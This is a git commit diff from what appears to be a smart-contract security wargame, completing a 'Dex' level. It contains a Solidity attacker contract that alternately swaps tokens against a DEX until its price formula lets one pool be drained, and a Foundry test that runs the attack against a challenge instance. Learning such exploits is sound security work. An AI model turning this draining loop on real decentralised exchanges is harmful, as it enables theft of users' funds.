122ad19f73d2fc7b2744bb8e257373d18e6c68fb
chihiro <carlosxu2017@gmail.com>
2022-09-01 22:50:00 -0700

    dex level complete

--- src/AttackDex.sol
+++ src/AttackDex.sol
@@ -1,7 +1,7 @@
 pragma solidity ^0.8.10;
 
 import "forge-std/Test.sol";
-import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
+import "openzeppelin-contracts/contracts/token/ERC20/IERC20.sol";
 
 interface IDex{
     function token1() external returns(address);
@@ -9,6 +9,7 @@ interface IDex{
     function swap(address from, address to, uint amount) external;
     function getSwapPrice(address from, address to, uint amount) external view returns(uint);    
     function balanceOf(address token, address account) external view returns (uint);
+    function approve(address spender, uint amount) external;
 }
 
 contract AttackDex{        
@@ -28,19 +29,54 @@ contract AttackDex{
         dex.swap(from ,to, newAmount);        
     }
 
-    function attack() public {
-        console.log(dex.balanceOf(token2, msg.sender));
-        console.log(dex.balanceOf(token2, address(dex)));
-        console.log(IERC20(token2).balanceOf(msg.sender));
-        dex.swap(token2, token1, dex.balanceOf(token2, msg.sender)); //start player where all in token1
-        address tokenFrom = token1;
-        address tokenTo = token2;
-        while ((dex.balanceOf(token1,address(dex)) > 0)&&(dex.balanceOf(token2,address(dex)) > 0)) {
-            console.log("token1:", dex.balanceOf(token1,msg.sender));
-            console.log("token2:", dex.balanceOf(token2,msg.sender));
-            lowerboundSwap(tokenFrom, tokenTo, dex.balanceOf(tokenFrom,msg.sender));
+    function attack() public {        
+        //before this step, player needs to send tx to approve coins for this attacker contract to use       
+        //transfer all coins from player to this attacker contract  
+        IERC20(token1).transferFrom(msg.sender, address(this), IERC20(token1).balanceOf(msg.sender));
+        IERC20(token2).transferFrom(msg.sender, address(this), IERC20(token2).balanceOf(msg.sender));                
+
+        dex.approve(address(dex), 9999); //allow dex contract to use our attacker's tokens
+        
+        //start player where all in token1
+        address tokenFrom = token2;
+        address tokenTo = token1;
+        console.log("Printing coin balances in DEX contract");
+        while ((dex.balanceOf(token1,address(dex)) > 0)&&(dex.balanceOf(token2,address(dex)) > 0)) {            
+            lowerboundSwap(tokenFrom, tokenTo, dex.balanceOf(tokenFrom,address(this)));
             (tokenFrom, tokenTo) = (tokenTo, tokenFrom);
+
+            console.log("------");
+            console.log("token1:", dex.balanceOf(token1,address(dex)));
+            console.log("token2:", dex.balanceOf(token2,address(dex)));
         }
 
     }
 }
+
+
+//player needs to approve coins for this attacker contract to use 
+        // console.log(address(this));
+        // IERC20(token1).transferFrom(msg.sender, address(this), IERC20(token1).balanceOf(msg.sender));
+        // console.log(dex.balanceOf(token1, address(this)));
+
+        // console.log(dex.balanceOf(token1, address(this)));
+        // console.log(IERC20(token1).balanceOf(msg.sender));
+        // IERC20(token1).transfer(address(this), 1);
+        // console.log(dex.balanceOf(token1, address(this)));
+
+        // dex.approve(address(dex), 9999); //allow dex contract to use our player's tokens
+        // console.log(dex.balanceOf(token2, msg.sender));
+        // console.log(IERC20(token2).balanceOf(msg.sender));
+        // console.log(IERC20(token2).balanceOf(address(this)));
+        
+        // dex.swap(token2, token1, dex.balanceOf(token2, msg.sender)); //start player where all in token1
+
+        // address tokenFrom = token1;
+        // address tokenTo = token2;
+        // while ((dex.balanceOf(token1,address(dex)) > 0)&&(dex.balanceOf(token2,address(dex)) > 0)) {
+        //     console.log("------");
+        //     console.log("token1:", dex.balanceOf(token1,msg.sender));
+        //     console.log("token2:", dex.balanceOf(token2,msg.sender));
+        //     lowerboundSwap(tokenFrom, tokenTo, dex.balanceOf(tokenFrom,msg.sender));
+        //     (tokenFrom, tokenTo) = (tokenTo, tokenFrom);
+        // }
--- test/AttackDex.t.sol
+++ test/AttackDex.t.sol
@@ -4,15 +4,21 @@ pragma solidity ^0.8.10;
 import "forge-std/Test.sol";
 import "src/AttackDex.sol";
 
-contract TestShop is Test {
+contract TestDex is Test {
     AttackDex x;
+    IDex d;
     function setUp() public {}
 
     function testShop() public{
         
         vm.startPrank(0x9bdcf9696e273aFd83992b1Fb5672A70532ca9E1);
-        address victim = 0x7AfD1F1f0C70F0456BD7A1D76885D1d0a615fD59;                
-        x = new AttackDex(victim);
+        address victim = 0x23bd651A4C98f880F0F6f209B4dAf32b2392ddc9;                
+        x = new AttackDex(victim);        
+        d = IDex(victim);        
+
+        //give allowance to attacker to move tokens from player to attacker
+        d.approve(address(x), 9999);
+
         x.attack();
         vm.stopPrank();
     }
